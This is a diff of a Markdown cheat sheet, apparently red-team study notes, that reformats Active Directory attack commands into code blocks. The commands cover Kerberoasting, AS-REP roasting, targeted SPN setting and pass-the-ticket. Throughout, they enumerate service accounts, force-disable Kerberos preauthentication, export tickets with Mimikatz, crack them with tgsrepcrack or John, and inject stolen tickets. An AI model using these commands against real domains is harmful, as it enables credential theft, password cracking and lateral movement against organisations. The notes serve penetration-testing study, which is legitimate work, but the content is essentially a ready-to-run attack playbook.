@@ -28,24 +28,44 @@ Machine accounts wont work, because they create 100 characters and rotate it eve
 
 ### Tool
 
-**1.Find user accounts used as service accounts:**\
-PowerView: Get-NetUser -SPN\
-\
-ADModule:\
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -properties ServicePrincipalName
+**1.Find user accounts used as service accounts (PowerView):**
 
-**2. Request a TGS for the SPN**\
-Add-Type -AssemblyName System.IdentityModel\
+{% code overflow="wrap" %}
+```powershell
+Get-NetUser -SPN
+
+ADModule:
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -properties ServicePrincipalName
+```
+{% endcode %}
+
+**2. Request a TGS for the SPN**
+
+{% code overflow="wrap" %}
+```powershell
+Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN Name from command before"
+```
+{% endcode %}
 
 Request-SPNTicket from PowerView can be used for cracking with John or Hashcat
 
-**3. Check if TGS in memory & save it to disk**\
-klist\
-Invoke-Mimikatz -Command '"kerberos::list /export"'
+**3. Check if TGS in memory & save it to disk**
 
-**4. Crack it with John/Hashcat/tsrepcrack**\
+{% code overflow="wrap" %}
+```powershell
+klist
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+```
+{% endcode %}
+
+**4. Crack it with John/Hashcat/tsrepcrack**
+
+{% code overflow="wrap" %}
+```powershell
 python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
+```
+{% endcode %}
 
 
 
@@ -66,26 +86,44 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
 ### Tool
 
 **1.Enumerate accounts with Kerberos Preauth disabled**\
-****PowerView dev: Get-DomainUser -PreauthNotRequired -verbose
+****
 
-AD Module: Get-ADUser -filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">PowerView dev: Get-DomainUser -PreauthNotRequired -verbose
+<strong>
+</strong><strong>AD Module: Get-ADUser -filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+</strong></code></pre>
 
 **1.OR - Force disable Kerberos PreAuth if we have enough privs GenericWrite and Generic All on user Accounts**
 
-**Enum permissions  for RDPUsers on ACL using PowerView Dev:**\
-****Invoke-ACLScanner -ResolveGUIDs | ?{$\_.IdentityReferenceName -match "RDPUsers"}\
-Set-DomainObject -Identity user1 -xor @{useraccountcontrol=4194304} -verbose\
+**Enum permissions  for RDPUsers on ACL using PowerView Dev:**
+
+{% code overflow="wrap" %}
+```powershell
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+Set-DomainObject -Identity user1 -xor @{useraccountcontrol=4194304} -verbose
 Get-DomainUser -PreauthNotRequired -verbose
+```
+{% endcode %}
 
-**2. Request encrypted AS-REP for offline cracking**\
-****Get-ASREPHash -Username user1 -verbose
+**2. Request encrypted AS-REP for offline cracking**
 
-**❗Enumerate all users with Kerberos preauth disalbed and request a hash**\
-****Invoke-ASREPRoast -verbose
+{% code overflow="wrap" %}
+```powershell
+Get-ASREPHash -Username user1 -verbose
+```
+{% endcode %}
 
-Crack it\
-cd JohnTheRipper-bleeding-jmbo\
+**❗Enumerate all users with Kerberos preauth disalbed and request a hash**
+
+```powershell
+Invoke-ASREPRoast -verbose
+
+Crack it
+cd JohnTheRipper-bleeding-jmbo
 ./john user1 --wordlist=wordlist.txt
+```
+
+
 
 ## 🎯🍳Targeted Kerberoasting - SetSPN
 
@@ -100,37 +138,57 @@ cd JohnTheRipper-bleeding-jmbo\
 
 ### Tool
 
-**1.Enum possible Users**\
-Invoke-ACLScanner -ResolveGUIDs | ?{$\_.IdentityReferenceName -match "RDPUsers"}
+**1.Enum possible Users**
 
-**2.Usinger PowerView dev, see if user alread has an SPN set**\
+{% code overflow="wrap" %}
+```powershell
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+```
+{% endcode %}
+
+**2.Usinger PowerView dev, see if user alread has an SPN set**
+
+{% code overflow="wrap" %}
+```powershell
 Get-DomainUser -Identity user1 | select servieprincipalname
-
-Using AD Module:\
+Using AD Module:
 Get-ADUser -Identity user1 -properties ServicePrincipalName | select ServicePrincipalName
+```
+{% endcode %}
 
-**3. If not, set an SPN (must be unique for the domain) - PowerView dev**\
-****Set-DomainObject -Identity user1 -Set @serviceprincipalname='what/ever'}\
-\
-Using AD Module\
+**3. If not, set an SPN (must be unique for the domain) - PowerView dev**
+
+{% code overflow="wrap" %}
+```powershell
+Set-DomainObject -Identity user1 -Set @serviceprincipalname='what/ever'}
+
+Using AD Module
 Set-ADuser -identity user1 -serviceprincipalname @{Add='nameyour/spn'}
+```
+{% endcode %}
 
 **4. Request a TGS for the SPN**
 
+{% code overflow="wrap" %}
 ```powershell
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "nameyour/spn"
 ```
+{% endcode %}
 
-`Add-Type -AssemblyName System.IdentityModel`\
-`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "nameyour/spn"`
+**3. Check if TGS in memory & save it to disk**
 
-**3. Check if TGS in memory & save it to disk**\
-`klist`\
-`Invoke-Mimikatz -Command '"kerberos::list /export"'`
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>klist
+</strong>Invoke-Mimikatz -Command '"kerberos::list /export"'
+</code></pre>
 
-**4. Crack it with John/Hashcat/tsrepcrack**\
-`python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport`
+**4. Crack it with John/Hashcat/tsrepcrack**
+
+{% code overflow="wrap" %}
+```powershell
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
+```
+{% endcode %}
 
 
 
@@ -192,8 +250,13 @@ Invoke-Mimikatz -command '"sekurlsa::ticket"'
 Invoke-Mimikatz -command '"sekurlsa::ticket /export"'  //saves it to the disk - then ls | select name
 ```
 
-**3. Reuse the token** \
+**3. Reuse the token**&#x20;
+
+{% code overflow="wrap" %}
+```powershell
 Invoke-Mimikatz -command '"kerberos::ptt C:\path\to\ticket"'
+```
+{% endcode %}
 
 
 
